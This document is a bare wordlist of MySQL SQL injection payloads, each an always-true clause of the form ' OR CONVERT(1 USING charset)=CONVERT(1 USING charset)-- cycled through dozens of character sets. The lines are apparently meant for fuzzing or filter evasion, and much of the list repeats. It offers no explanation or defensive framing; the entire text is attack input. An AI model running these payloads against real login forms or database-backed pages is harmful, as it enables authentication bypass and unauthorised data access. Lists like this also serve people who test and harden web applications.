+' OR CONVERT(1 USING geostd8)=CONVERT(1 USING geostd8)--
+' OR CONVERT(1 USING greek)=CONVERT(1 USING greek)--
+' OR CONVERT(1 USING hebrew)=CONVERT(1 USING hebrew)--
+' OR CONVERT(1 USING hp8)=CONVERT(1 USING hp8)--
+' OR CONVERT(1 USING keybcs2)=CONVERT(1 USING keybcs2)--
+' OR CONVERT(1 USING koi8r)=CONVERT(1 USING koi8r)--
+' OR CONVERT(1 USING koi8u)=CONVERT(1 USING koi8u)--
+' OR CONVERT(1 USING latin1)=CONVERT(1 USING latin1)--
+' OR CONVERT(1 USING latin2)=CONVERT(1 USING latin2)--
+' OR CONVERT(1 USING latin5)=CONVERT(1 USING latin5)--
+' OR CONVERT(1 USING latin7)=CONVERT(1 USING latin7)--
+' OR CONVERT(1 USING macce)=CONVERT(1 USING macce)--
+' OR CONVERT(1 USING macroman)=CONVERT(1 USING macroman)--
+' OR CONVERT(1 USING sjis)=CONVERT(1 USING sjis)--
+' OR CONVERT(1 USING swe7)=CONVERT(1 USING swe7)--
+' OR CONVERT(1 USING tis620)=CONVERT(1 USING tis620)--
+' OR CONVERT(1 USING ucs2)=CONVERT(1 USING ucs2)--
+' OR CONVERT(1 USING ujis)=CONVERT(1 USING ujis)--
+' OR CONVERT(1 USING armscii8)=CONVERT(1 USING armscii8)--
+' OR CONVERT(1 USING cp1250)=CONVERT(1 USING cp1250)--
+' OR CONVERT(1 USING cp1257)=CONVERT(1 USING cp1257)--
+' OR CONVERT(1 USING cp864)=CONVERT(1 USING cp864)--
+' OR CONVERT(1 USING cp869)=CONVERT(1 USING cp869)--
+' OR CONVERT(1 USING geostd8)=CONVERT(1 USING geostd8)--
+' OR CONVERT(1 USING latin1)=CONVERT(1 USING latin1)--
+' OR CONVERT(1 USING utf8)=CONVERT(1 USING utf8)--
+' OR CONVERT(1 USING utf8mb4)=CONVERT(1 USING utf8mb4)--
+' OR CONVERT(1 USING utf16)=CONVERT(1 USING utf16)--
+' OR CONVERT(1 USING utf32)=CONVERT(1 USING utf32)--
+' OR CONVERT(1 USING binary)=CONVERT(1 USING binary)--
+' OR CONVERT(1 USING ascii)=CONVERT(1 USING ascii)--
+' OR CONVERT(1 USING cp1251)=CONVERT(1 USING cp1251)--
+' OR CONVERT(1 USING cp1256)=CONVERT(1 USING cp1256)--
+' OR CONVERT(1 USING cp850)=CONVERT(1 USING cp850)--
+' OR CONVERT(1 USING cp852)=CONVERT(1 USING cp852)--
+' OR CONVERT(1 USING cp866)=CONVERT(1 USING cp866)--
+' OR CONVERT(1 USING cp932)=CONVERT(1 USING cp932)--
+' OR CONVERT(1 USING dec8)=CONVERT(1 USING dec8)--
+' OR CONVERT(1 USING eucjpms)=CONVERT(1 USING eucjpms)--
+' OR CONVERT(1 USING euckr)=CONVERT(1 USING euckr)--
+' OR CONVERT(1 USING gb18030)=CONVERT(1 USING gb18030)--
+' OR CONVERT(1 USING gb2312)=CONVERT(1 USING gb2312)--
+' OR CONVERT(1 USING gbk)=CONVERT(1 USING gbk)--
+' OR CONVERT(1 USING geostd8)=CONVERT(1 USING geostd8)--
+' OR CONVERT(1 USING greek)=CONVERT(1 USING greek)--
+' OR CONVERT(1 USING hebrew)=CONVERT(1 USING hebrew)--
+' OR CONVERT(1 USING hp8)=CONVERT(1 USING hp8)--
+' OR CONVERT(1 USING keybcs2)=CONVERT(1 USING keybcs2)--
+' OR CONVERT(1 USING koi8r)=CONVERT(1 USING koi8r)--
+' OR CONVERT(1 USING koi8u)=CONVERT(1 USING koi8u)--
+' OR CONVERT(1 USING latin1)=CONVERT(1 USING latin1)--
+' OR CONVERT(1 USING latin2)=CONVERT(1 USING latin2)--
+' OR CONVERT(1 USING latin5)=CONVERT(1 USING latin5)--
+' OR CONVERT(1 USING latin7)=CONVERT(1 USING latin7)--
+' OR CONVERT(1 USING macce)=CONVERT(1 USING macce)--
+' OR CONVERT(1 USING macroman)=CONVERT(1 USING macroman)--
+' OR CONVERT(1 USING sjis)=CONVERT(1 USING sjis)--
+' OR CONVERT(1 USING swe7)=CONVERT(1 USING swe7)--
+' OR CONVERT(1 USING tis620)=CONVERT(1 USING tis620)--
+' OR CONVERT(1 USING ucs2)=CONVERT(1 USING ucs2)--
+' OR CONVERT(1 USING ujis)=CONVERT(1 USING ujis)--
+' OR CONVERT(1 USING armscii8)=CONVERT(1 USING armscii8)--
+' OR CONVERT(1 USING cp1250)=CONVERT(1 USING cp1250)--
+' OR CONVERT(1 USING cp1257)=CONVERT(1 USING cp1257)--
+' OR CONVERT(1 USING cp864)=CONVERT(1 USING cp864)--
+' OR CONVERT(1 USING cp869)=CONVERT(1 USING cp869)--
+' OR CONVERT(1 USING geostd8)=CONVERT(1 USING geostd8)--
